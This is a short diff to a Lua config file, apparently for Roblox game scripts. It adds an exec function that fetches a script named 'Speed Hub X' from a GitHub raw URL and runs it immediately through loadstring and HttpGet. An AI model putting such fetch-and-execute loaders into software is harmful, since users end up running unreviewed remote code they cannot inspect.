@@ -23,5 +23,8 @@ Config.Games = {
     [124977557560410] = Config.path .. "\\Grow a Garden.json"
 }
 
-return Config
+Config.exec = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+end
 
+return Config
